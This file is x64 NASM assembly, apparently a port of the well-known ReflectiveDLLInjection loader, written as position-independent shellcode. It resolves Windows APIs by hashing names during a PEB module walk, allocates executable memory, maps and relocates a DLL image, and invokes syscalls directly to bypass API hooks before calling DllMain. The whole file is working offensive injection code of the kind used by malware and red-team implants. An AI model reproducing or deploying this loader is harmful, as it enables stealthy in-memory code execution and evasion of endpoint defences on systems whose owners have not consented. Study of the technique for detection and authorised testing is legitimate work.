; =============================================================================
; ReflectiveLoader x64 - Position Independent Shellcode
; Port of: https://github.com/stephenfewer/ReflectiveDLLInjection
; Original author: Stephen Fewer / Harmony Security
; Author of this port: jbx81 (github.com/jbx81-1337)
; NASM syntax, Microsoft x64 ABI, no relocations
; Assemble: nasm -f bin reflective_loader.asm -o reflective_loader.bin
; =============================================================================

BITS 64
DEFAULT REL

; ---------------------------------------------------------------------------
; Hash constants (from ReflectiveLoader.h)
; ---------------------------------------------------------------------------
KERNEL32DLL_HASH            EQU 0x6A4ABC5B
NTDLLDLL_HASH               EQU 0x3CFA685D
LOADLIBRARYA_HASH           EQU 0xEC0E4E8E
GETPROCADDRESS_HASH         EQU 0x7C0DFCAA
ZWALLOCATEVIRTUALMEMORY_HASH EQU 0xD33D4AED
ZWPROTECTVIRTUALMEMORY_HASH EQU 0xBC3F4D89
NTFLUSHINSTRUCTIONCACHE_HASH EQU 0x534C0AB8

; PE / reloc constants
IMAGE_DOS_SIGNATURE         EQU 0x5A4D
IMAGE_NT_SIGNATURE          EQU 0x00004550
IMAGE_ORDINAL_FLAG64        EQU 0x8000000000000000
IMAGE_REL_BASED_ABSOLUTE    EQU 0
IMAGE_REL_BASED_HIGHLOW     EQU 3
IMAGE_REL_BASED_DIR64       EQU 10

MEM_RESERVE                 EQU 0x2000
MEM_COMMIT                  EQU 0x1000
PAGE_EXECUTE_READWRITE      EQU 0x40
DLL_PROCESS_ATTACH          EQU 1

; ---------------------------------------------------------------------------
; Stack frame layout (rbp-based, 8-byte slots after shadow+locals)
; We reserve space for locals via sub rsp,N in the prologue.
; Slot names (negative offsets from rbp after push rbp / mov rbp,rsp):
;   [rbp - 8 ]  = pLoadLibraryA
;   [rbp - 16]  = pGetProcAddress
;   [rbp - 24]  = pZwAllocateVirtualMemory
;   [rbp - 32]  = pNtFlushInstructionCache
;   [rbp - 40]  = uiLibraryAddress  (image scan ptr / later delta)
;   [rbp - 48]  = uiBaseAddress     (new alloc / kernel32 base)
;   [rbp - 56]  = uiHeaderValue     (NT header VA)
;   [rbp - 64]  = uiExportDir
;   [rbp - 72]  = uiNameArray
;   [rbp - 80]  = uiNameOrdinals
;   [rbp - 88]  = uiAddressArray
;   [rbp - 96]  = uiValueA          (saved module list entry pointer)
;   [rbp - 104] = uiValueB
;   [rbp - 112] = uiValueC
;   [rbp - 120] = uiValueD
;   [rbp - 128] = uiValueE
;   [rbp - 136] = usCounter  (USHORT, stored as qword)
;   [rbp - 144] = dwHashValue
;   [rbp - 152] = pZwProtectVirtualMemory
; ---------------------------------------------------------------------------
%define pLoadLibraryA           qword [rbp -   8]
%define pGetProcAddress         qword [rbp -  16]
%define pZwAllocateVirtualMemory qword [rbp -  24]
%define pNtFlushInstructionCache qword [rbp - 32]
%define uiLibraryAddress        qword [rbp -  40]
%define uiBaseAddress           qword [rbp -  48]
%define uiHeaderValue           qword [rbp -  56]
%define uiExportDir             qword [rbp -  64]
%define uiNameArray             qword [rbp -  72]
%define uiNameOrdinals          qword [rbp -  80]
%define uiAddressArray          qword [rbp -  88]
%define uiValueA                qword [rbp -  96]
%define uiValueB                qword [rbp - 104]
%define uiValueC                qword [rbp - 112]
%define uiValueD                qword [rbp - 120]
%define uiValueE                qword [rbp - 128]
%define usCounter               qword [rbp - 136]
%define dwHashValue             qword [rbp - 144]
%define pZwProtectVirtualMemory  qword [rbp - 152]

; ============================================================================
; Entry: ReflectiveLoader()
;   rcx = image base (if nonzero), else auto-detect via RIP scan
;   Returns in RAX: VA of DllMain in newly mapped image
; ============================================================================
global ReflectiveLoader
ReflectiveLoader:
    ; ---- prologue -----------------------------------------------------------
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0xA0           ; 144 bytes locals + 16-byte align padding
    and     rsp, 0xFFFFFFFFFFFFFFF0
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15

    ; zero the function pointer slots
    xor     rax, rax
    mov     pLoadLibraryA,            rax
    mov     pGetProcAddress,          rax
    mov     pZwAllocateVirtualMemory, rax
    mov     pNtFlushInstructionCache, rax
    mov     pZwProtectVirtualMemory,  rax
    xor     rcx, rcx                     ; disable base address as parameter. compatible with standard reflective loader.
    test    rcx, rcx
    jnz     .found_base

    ; =========================================================================
    ; STEP 0: find our own image base by scanning backwards from RIP
    ; =========================================================================
    call    .get_rip
.get_rip:
    pop     rcx                         ; rcx = address of this pop instruction

    ; page-align downward and scan for MZ + valid PE signature
    and     rcx, 0xFFFFFFFFFFFFF000     ; page-align
.scan_page:
    mov     ax, word [rcx]
    cmp     ax, IMAGE_DOS_SIGNATURE     ; 'MZ'
    jne     .next_page
    ; check e_lfanew range [sizeof(IMAGE_DOS_HEADER)=0x40 .. 0x400)
    mov     eax, dword [rcx + 0x3C]    ; e_lfanew
    cmp     eax, 0x40
    jb      .next_page
    cmp     eax, 0x400
    jae     .next_page
    ; check NT signature
    lea     rdx, [rcx + rax]
    mov     eax, dword [rdx]
    cmp     eax, IMAGE_NT_SIGNATURE     ; 'PE\0\0'
    je      .found_base
.next_page:
    sub     rcx, 0x1000
    jmp     .scan_page

.found_base:
    ; rcx = our DLL image base
    mov     uiLibraryAddress, rcx       ; save original (source) base

    ; =========================================================================
    ; STEP 1: walk PEB -> LDR -> InMemoryOrderModuleList
    ;         find kernel32 and ntdll, resolve 5 function pointers by hash
    ; =========================================================================
    ; x64: PEB at GS:[0x60]
    mov     rax, qword gs:[0x60]        ; rax = PEB
    mov     rax, [rax + 0x18]           ; rax = PEB.Ldr (PEB_LDR_DATA*)
    mov     rax, [rax + 0x20]           ; rax = InMemoryOrderModuleList.Flink

.walk_modules:
    test    rax, rax
    jz      .step2

    ; Save module list entry pointer so we can advance after processing
    mov     uiValueA, rax

    ; Offsets relative to the InMemoryOrder Flink pointer (entry start):
    ;   DllBase             = +0x20
    ;   BaseDllName.Length  = +0x48
    ;   BaseDllName.Buffer  = +0x50  (PWSTR, points to UTF-16LE name)

    movzx   rcx, word [rax + 0x48]     ; BaseDllName.Length (bytes)
    test    rcx, rcx
    jz      .next_module
    mov     rdx, [rax + 0x50]          ; BaseDllName.Buffer (PWSTR)

    ; hash the module name (byte-by-byte over UTF-16LE, uppercase normalize)
    mov     r12d, 0                   ; r12d = hash accumulator
.hash_modname:
    ror     r12d, 13
    movzx   ebx, byte [rdx]
    cmp     bl, 'a'
    jb      .hash_no_upper
    sub     bl, 0x20                    ; to uppercase
.hash_no_upper:
    add     r12d, ebx
    inc     rdx
    dec     rcx
    jnz     .hash_modname

    ; check hashes
    cmp     r12d, KERNEL32DLL_HASH
    je      .process_kernel32
    cmp     r12d, NTDLLDLL_HASH
    je      .process_ntdll
    jmp     .next_module

    ; ------------------------------------------------------------------
    ; process_kernel32: find LoadLibraryA, GetProcAddress
    ; ------------------------------------------------------------------
.process_kernel32:
    mov     rax, uiValueA              ; restore module entry pointer
    mov     r13, [rax + 0x20]          ; DllBase
    mov     uiBaseAddress, r13
    call    .get_export_info           ; sets uiExportDir, uiNameArray, uiNameOrdinals, uiValueC=NumberOfNames
    mov     usCounter, 2               ; we want 2 functions

.k32_export_loop:
    ; bounds check: have we exhausted all exports?
    mov     rax, uiValueC
    test    rax, rax
    jz      .check_all_found
    dec     rax
    mov     uiValueC, rax

    ; hash the export name
    mov     rcx, uiNameArray
    mov     ecx, dword [rcx]           ; RVA of name
    add     rcx, uiBaseAddress          ; VA of name string
    call    .hash_funcname              ; returns hash in eax
    mov     dwHashValue, rax

    cmp     eax, LOADLIBRARYA_HASH
    je      .k32_store_func
    cmp     eax, GETPROCADDRESS_HASH
    je      .k32_store_func
    jmp     .k32_next_export

.k32_store_func:
    ; get AddressOfFunctions
    mov     r14, uiExportDir
    mov     r14d, dword [r14 + 0x1C]   ; AddressOfFunctions RVA
    add     r14, uiBaseAddress          ; VA
    ; index = ordinal from NameOrdinals table
    mov     r15, uiNameOrdinals
    movzx   r15d, word [r15]           ; ordinal index
    lea     r14, [r14 + r15*4]         ; &AddressOfFunctions[ordinal]
    mov     r14d, dword [r14]          ; function RVA
    add     r14, uiBaseAddress         ; function VA

    mov     eax, dword [rbp - 144]     ; dwHashValue low 32
    cmp     eax, LOADLIBRARYA_HASH
    jne     .k32_try_gpa
    mov     pLoadLibraryA, r14
    jmp     .k32_dec_counter
.k32_try_gpa:
    mov     pGetProcAddress, r14
.k32_dec_counter:
    mov     rax, usCounter
    dec     rax
    mov     usCounter, rax
    ; early out if all kernel32 functions found
    test    rax, rax
    jz      .check_all_found

.k32_next_export:
    add     uiNameArray,    4           ; next DWORD
    add     uiNameOrdinals, 2           ; next WORD
    jmp     .k32_export_loop

    ; ------------------------------------------------------------------
    ; process_ntdll: find NtFlushInstructionCache, ZwAllocateVirtualMemory,
    ;                      ZwProtectVirtualMemory
    ; ------------------------------------------------------------------
.process_ntdll:
    mov     rax, uiValueA              ; restore module entry pointer
    mov     r13, [rax + 0x20]          ; DllBase
    mov     uiBaseAddress, r13
    call    .get_export_info           ; sets uiExportDir, uiNameArray, uiNameOrdinals, uiValueC=NumberOfNames
    mov     usCounter, 3               ; we want 3 functions

.ntdll_export_loop:
    ; bounds check
    mov     rax, uiValueC
    test    rax, rax
    jz      .check_all_found
    dec     rax
    mov     uiValueC, rax

    mov     rcx, uiNameArray
    mov     ecx, dword [rcx]
    add     rcx, uiBaseAddress
    call    .hash_funcname
    mov     dwHashValue, rax

    cmp     eax, NTFLUSHINSTRUCTIONCACHE_HASH
    je      .ntdll_store_func
    cmp     eax, ZWALLOCATEVIRTUALMEMORY_HASH
    je      .ntdll_store_func
    cmp     eax, ZWPROTECTVIRTUALMEMORY_HASH
    je      .ntdll_store_func
    jmp     .ntdll_next

.ntdll_store_func:
    mov     r14, uiExportDir
    mov     r14d, dword [r14 + 0x1C]
    add     r14, uiBaseAddress
    mov     r15, uiNameOrdinals
    movzx   r15d, word [r15]
    lea     r14, [r14 + r15*4]
    mov     r14d, dword [r14]
    add     r14, uiBaseAddress

    mov     eax, dword [rbp - 144]     ; dwHashValue low 32
    cmp     eax, NTFLUSHINSTRUCTIONCACHE_HASH
    jne     .ntdll_try_zw
    mov     pNtFlushInstructionCache, r14
    jmp     .ntdll_dec_counter
.ntdll_try_zw:
    cmp     eax, ZWALLOCATEVIRTUALMEMORY_HASH
    jne     .ntdll_try_zw_prot
    mov     pZwAllocateVirtualMemory, r14
    jmp     .ntdll_dec_counter
.ntdll_try_zw_prot:
    mov     pZwProtectVirtualMemory, r14
.ntdll_dec_counter:
    mov     rax, usCounter
    dec     rax
    mov     usCounter, rax
    test    rax, rax
    jz      .check_all_found

.ntdll_next:
    add     uiNameArray,    4
    add     uiNameOrdinals, 2
    jmp     .ntdll_export_loop

.check_all_found:
    mov     rax, pLoadLibraryA
    test    rax, rax
    jz      .next_module
    mov     rax, pGetProcAddress
    test    rax, rax
    jz      .next_module
    mov     rax, pZwAllocateVirtualMemory
    test    rax, rax
    jz      .next_module
    mov     rax, pZwProtectVirtualMemory
    test    rax, rax
    jz      .next_module
    mov     rax, pNtFlushInstructionCache
    test    rax, rax
    jnz     .step2

.next_module:
    mov     rax, uiValueA              ; restore saved module entry pointer
    mov     rax, [rax]                 ; Flink -> next LIST_ENTRY
    jmp     .walk_modules

    ; =========================================================================
    ; STEP 2: ZwAllocateVirtualMemory a new region and copy headers
    ; =========================================================================
.step2:
    ; uiHeaderValue = uiLibraryAddress + e_lfanew
    mov     rcx, uiLibraryAddress
    mov     eax, dword [rcx + 0x3C]
    lea     r12, [rcx + rax]           ; r12 = NT headers VA
    mov     uiHeaderValue, r12

    ; ZwAllocateVirtualMemory(-1, &BaseAddress, 0, &RegionSize,
    ;                         MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    ; SizeOfImage at NT+0x50
    ; Stack layout: shadow(0x20) + 2 stack params(0x10) + pad(0x08) + 2 locals(0x10)
    sub     rsp, 0x48
    xor     rax, rax
    mov     [rsp + 0x38], rax          ; local BaseAddress = NULL
    mov     eax, dword [r12 + 0x50]    ; SizeOfImage
    mov     [rsp + 0x40], rax          ; local RegionSize = SizeOfImage
    mov     rcx, -1                    ; ProcessHandle = current process
    lea     rdx, [rsp + 0x38]          ; pBaseAddress
    xor     r8, r8                     ; ZeroBits = 0
    lea     r9, [rsp + 0x40]           ; pRegionSize
    mov     dword [rsp + 0x20], MEM_RESERVE | MEM_COMMIT
    mov     dword [rsp + 0x28], PAGE_EXECUTE_READWRITE
    mov     r10, pZwAllocateVirtualMemory
    call    .direct_syscall
    mov     rax, [rsp + 0x38]          ; retrieve allocated BaseAddress
    add     rsp, 0x48
    mov     uiBaseAddress, rax         ; save new base

    ; copy headers: SizeOfHeaders bytes from uiLibraryAddress to uiBaseAddress
    ; SizeOfHeaders at OptionalHeader offset 0x3C => NT+0x18+0x3C = NT+0x54
    mov     ecx, dword [r12 + 0x54]   ; SizeOfHeaders
    mov     rsi, uiLibraryAddress
    mov     rdi, uiBaseAddress
    rep movsb

    ; =========================================================================
    ; STEP 3: copy sections
    ; =========================================================================
    ; IMAGE_FILE_HEADER.SizeOfOptionalHeader at NT+0x14
    movzx   rax, word [r12 + 0x14]    ; SizeOfOptionalHeader
    lea     r13, [r12 + 0x18 + rax]   ; pointer to first IMAGE_SECTION_HEADER
    ; IMAGE_FILE_HEADER.NumberOfSections at NT+0x06
    movzx   r15d, word [r12 + 0x06]

.copy_sections:
    test    r15d, r15d
    jz      .step4

    ; destination: uiBaseAddress + section.VirtualAddress
    mov     eax, dword [r13 + 0x0C]   ; VirtualAddress
    mov     rdi, uiBaseAddress
    add     rdi, rax

    ; source: uiLibraryAddress + section.PointerToRawData
    mov     eax, dword [r13 + 0x14]   ; PointerToRawData
    mov     rsi, uiLibraryAddress
    add     rsi, rax

    ; size: SizeOfRawData
    mov     ecx, dword [r13 + 0x10]   ; SizeOfRawData
    rep movsb

    add     r13, 40                    ; sizeof(IMAGE_SECTION_HEADER) = 40
    dec     r15d
    jmp     .copy_sections

    ; =========================================================================
    ; STEP 4: process import table
    ; =========================================================================
.step4:
    ; IMAGE_DIRECTORY_ENTRY_IMPORT (index 1)
    ; DataDirectory[1] = NT+0x88 + 1*8 = NT+0x90
    mov     eax, dword [r12 + 0x90]   ; import dir VirtualAddress
    test    eax, eax
    jz      .step5
    mov     r14, uiBaseAddress
    add     r14, rax                   ; r14 = first IMAGE_IMPORT_DESCRIPTOR

.import_desc_loop:
    mov     eax, dword [r14 + 0x0C]   ; Name RVA
    test    eax, eax
    jz      .step5

    ; LoadLibraryA(name)
    mov     rcx, uiBaseAddress
    add     rcx, rax
    sub     rsp, 0x28
    call    pLoadLibraryA
    add     rsp, 0x28
    mov     r13, rax                   ; r13 = loaded library base

    ; OriginalFirstThunk (prefer over FirstThunk for lookup)
    mov     eax, dword [r14 + 0x00]
    test    eax, eax
    jnz     .have_oft
    ; fall back to FirstThunk if no OriginalFirstThunk
    mov     eax, dword [r14 + 0x10]
.have_oft:
    mov     rsi, uiBaseAddress
    add     rsi, rax                   ; rsi = thunk array for lookup (OFT or FT)

    ; FirstThunk (IAT) — this is what we patch
    mov     eax, dword [r14 + 0x10]
    mov     rdi, uiBaseAddress
    add     rdi, rax                   ; rdi = IAT entry (QWORD)

.iat_loop:
    ; read thunk value from OFT/FT for lookup
    mov     rax, [rsi]
    test    rax, rax
    jz      .next_import_desc

    ; check IMAGE_ORDINAL_FLAG64
    mov     rcx, IMAGE_ORDINAL_FLAG64
    test    rax, rcx
    jnz     .import_by_ordinal

    ; import by name: rax = RVA of IMAGE_IMPORT_BY_NAME
    mov     rcx, uiBaseAddress
    add     rcx, rax                   ; rcx -> IMAGE_IMPORT_BY_NAME
    add     rcx, 2                     ; skip Hint (WORD), point to Name
    ; GetProcAddress(r13, name)
    sub     rsp, 0x28
    mov     rdx, rcx
    mov     rcx, r13
    call    pGetProcAddress
    add     rsp, 0x28
    mov     [rdi], rax                 ; patch IAT
    jmp     .next_iat

.import_by_ordinal:
    ; GetProcAddress(hModule, MAKEINTRESOURCE(ordinal))
    ; MAKEINTRESOURCE = ordinal value as pointer (low 16 bits)
    movzx   rdx, word [rsi]           ; ordinal = low 16 bits of thunk
    sub     rsp, 0x28
    mov     rcx, r13
    call    pGetProcAddress
    add     rsp, 0x28
    mov     [rdi], rax                 ; patch IAT

.next_iat:
    add     rsi, 8                     ; next lookup thunk (QWORD)
    add     rdi, 8                     ; next IAT entry (QWORD)
    jmp     .iat_loop

.next_import_desc:
    add     r14, 20                    ; sizeof(IMAGE_IMPORT_DESCRIPTOR) = 20
    jmp     .import_desc_loop

    ; =========================================================================
    ; STEP 5: apply base relocations
    ; =========================================================================
.step5:
    ; delta = new_base - original ImageBase
    ; OptionalHeader.ImageBase at OptHdr+0x18 => NT+0x18+0x18 = NT+0x30
    mov     rax, uiBaseAddress
    mov     rcx, [r12 + 0x30]         ; OptionalHeader.ImageBase
    sub     rax, rcx
    mov     uiLibraryAddress, rax      ; reuse slot as delta

    ; reloc dir: DataDirectory[5] = NT+0x88 + 5*8 = NT+0xB0
    mov     eax, dword [r12 + 0xB0]   ; reloc dir VirtualAddress
    test    eax, eax
    jz      .step6
    mov     ecx, dword [r12 + 0xB4]   ; reloc dir Size
    test    ecx, ecx
    jz      .step6

    mov     r14, uiBaseAddress
    add     r14, rax                   ; r14 = first IMAGE_BASE_RELOCATION block

.reloc_block_loop:
    mov     eax, dword [r14 + 4]       ; SizeOfBlock
    test    eax, eax
    jz      .step6

    ; number of reloc entries = (SizeOfBlock - 8) / 2
    sub     eax, 8
    shr     eax, 1
    mov     r15d, eax

    ; block page base VA (must use 64-bit add to preserve high bits)
    mov     eax, dword [r14 + 0]       ; block VirtualAddress (DWORD)
    mov     r13, uiBaseAddress
    add     r13, rax                   ; 64-bit add: r13 = base + VirtualAddress

    lea     r12, [r14 + 8]            ; first WORD entry

.reloc_entry_loop:
    test    r15d, r15d
    jz      .reloc_next_block

    movzx   eax, word [r12]
    mov     ebx, eax
    shr     ebx, 12                    ; type = high 4 bits
    and     eax, 0x0FFF               ; offset = low 12 bits

    cmp     ebx, IMAGE_REL_BASED_DIR64
    je      .reloc_dir64
    cmp     ebx, IMAGE_REL_BASED_HIGHLOW
    je      .reloc_highlow
    jmp     .reloc_next_entry          ; skip ABSOLUTE and others

.reloc_dir64:
    mov     rdx, uiLibraryAddress      ; delta
    add     qword [r13 + rax], rdx
    jmp     .reloc_next_entry

.reloc_highlow:
    mov     edx, dword [rbp - 40]      ; delta low 32 bits
    add     dword [r13 + rax], edx
    jmp     .reloc_next_entry

.reloc_next_entry:
    add     r12, 2
    dec     r15d
    jmp     .reloc_entry_loop

.reloc_next_block:
    mov     eax, dword [r14 + 4]       ; SizeOfBlock
    add     r14, rax
    jmp     .reloc_block_loop

    ; =========================================================================
    ; STEP 6: set correct memory protections per section
    ; =========================================================================
.step6:
    ; re-derive NT header (r12 may have been clobbered in reloc loop)
    mov     rcx, uiBaseAddress
    mov     eax, dword [rcx + 0x3C]
    lea     r12, [rcx + rax]

    ; walk section headers
    movzx   rax, word [r12 + 0x14]    ; SizeOfOptionalHeader
    lea     r13, [r12 + 0x18 + rax]   ; first IMAGE_SECTION_HEADER
    movzx   r15d, word [r12 + 0x06]   ; NumberOfSections

.protect_section_loop:
    test    r15d, r15d
    jz      .step7

    ; skip if VirtualSize is 0
    mov     eax, dword [r13 + 0x08]   ; VirtualSize
    test    eax, eax
    jz      .protect_next_section

    ; derive protection from Characteristics (offset 0x24)
    ; bits: 29=EXECUTE, 30=READ, 31=WRITE -> shift to bits 0,1,2
    mov     eax, dword [r13 + 0x24]   ; Characteristics
    shr     eax, 29
    and     eax, 0x7                   ; 3-bit index: XRW

    ; inline lookup: 3-bit index -> Windows memory protection constant
    jmp     .prot_table
.got_prot_table:
    pop     rbx
    movzx   ebx, byte [rbx + rax]     ; ebx = NewProtect

    ; ZwProtectVirtualMemory(-1, &BaseAddr, &RegionSize, NewProtect, &OldProtect)
    sub     rsp, 0x48
    ; local BaseAddress = uiBaseAddress + section.VirtualAddress
    mov     eax, dword [r13 + 0x0C]   ; section VirtualAddress RVA
    mov     rcx, uiBaseAddress
    add     rcx, rax
    mov     [rsp + 0x30], rcx          ; local BaseAddress
    ; local RegionSize = section.VirtualSize
    mov     eax, dword [r13 + 0x08]   ; VirtualSize
    mov     [rsp + 0x38], rax          ; local RegionSize
    ; local OldProtect
    mov     dword [rsp + 0x40], 0      ; OldProtect = 0
    mov     rcx, -1                    ; ProcessHandle = NtCurrentProcess
    lea     rdx, [rsp + 0x30]          ; &BaseAddress
    lea     r8, [rsp + 0x38]           ; &RegionSize
    mov     r9d, ebx                   ; NewProtect
    lea     rax, [rsp + 0x40]
    mov     [rsp + 0x20], rax          ; 5th param: &OldProtect
    mov     r10, pZwProtectVirtualMemory
    call    .direct_syscall
    add     rsp, 0x48

.protect_next_section:
    add     r13, 40                    ; next section header
    dec     r15d
    jmp     .protect_section_loop

    ; =========================================================================
    ; STEP 7: call DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL)
    ; =========================================================================
.step7:
    ; re-derive NT header (r12 may have been clobbered in protect loop)
    mov     rcx, uiBaseAddress
    mov     eax, dword [rcx + 0x3C]
    lea     r12, [rcx + rax]

    ; AddressOfEntryPoint at OptHdr+0x10 => NT+0x18+0x10 = NT+0x28
    mov     eax, dword [r12 + 0x28]
    mov     r13, uiBaseAddress
    add     r13, rax                   ; r13 = DllMain VA

    ; NtFlushInstructionCache(-1, NULL, 0)
    sub     rsp, 0x28
    mov     rcx, -1
    xor     rdx, rdx
    xor     r8d, r8d
    call    pNtFlushInstructionCache
    add     rsp, 0x28

    ; call DllMain(hInstance, DLL_PROCESS_ATTACH, NULL)
    sub     rsp, 0x28
    mov     rcx, uiBaseAddress
    mov     edx, DLL_PROCESS_ATTACH
    xor     r8d, r8d
    call    r13
    add     rsp, 0x28

    ; return DllMain VA in rax
    mov     rax, r13

    ; ---- epilogue -----------------------------------------------------------
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    mov     rsp, rbp
    pop     rbp
    ret

.direct_syscall:
    ; ========================================================================
    ; HELPER: .direct_syscall
    ; IN: r10 = Zw function address
    ; ========================================================================
    mov eax, dword [r10 + 0x4]
    lea r11, [r10 + 8]
    mov r10, rcx
    jmp r11
    
    ; =========================================================================
    ; HELPER: .get_export_info
    ; IN:  r13 = module DllBase, uiBaseAddress = same
    ; OUT: uiExportDir, uiNameArray, uiNameOrdinals, uiValueC=NumberOfNames
    ; CLOBBERS: rax, rbx, rcx
    ; =========================================================================
.get_export_info:
    ; NT headers
    mov     eax, dword [r13 + 0x3C]
    lea     rbx, [r13 + rax]           ; rbx = NT headers
    ; export dir: DataDirectory[0] at NT+0x88
    mov     eax, dword [rbx + 0x88]    ; export dir RVA
    lea     rcx, [r13 + rax]           ; export dir VA
    mov     uiExportDir, rcx
    ; NumberOfNames
    mov     eax, dword [rcx + 0x18]
    mov     uiValueC, rax              ; save as export count bound
    ; AddressOfNames
    mov     eax, dword [rcx + 0x20]
    lea     rax, [r13 + rax]
    mov     uiNameArray, rax
    ; AddressOfNameOrdinals
    mov     eax, dword [rcx + 0x24]
    lea     rax, [r13 + rax]
    mov     uiNameOrdinals, rax
    ret

    ; =========================================================================
    ; HELPER: .hash_funcname
    ; IN:  rcx = pointer to null-terminated ASCII function name
    ; OUT: eax = ROR13 hash
    ; CLOBBERS: rbx, rcx
    ; =========================================================================
.hash_funcname:
    mov     eax, 0
.hfn_loop:
    movzx   ebx, byte [rcx]
    test    ebx, ebx
    jz      .hfn_done
    ror     eax, 13
    add     eax, ebx
    inc     rcx
    jmp     .hfn_loop
.hfn_done:
    ret
.prot_table:
    call .got_prot_table
    ;       ---   X     R     XR    W     XW    RW    XRW
    db      0x01, 0x10, 0x02, 0x20, 0x04, 0x40, 0x04, 0x40
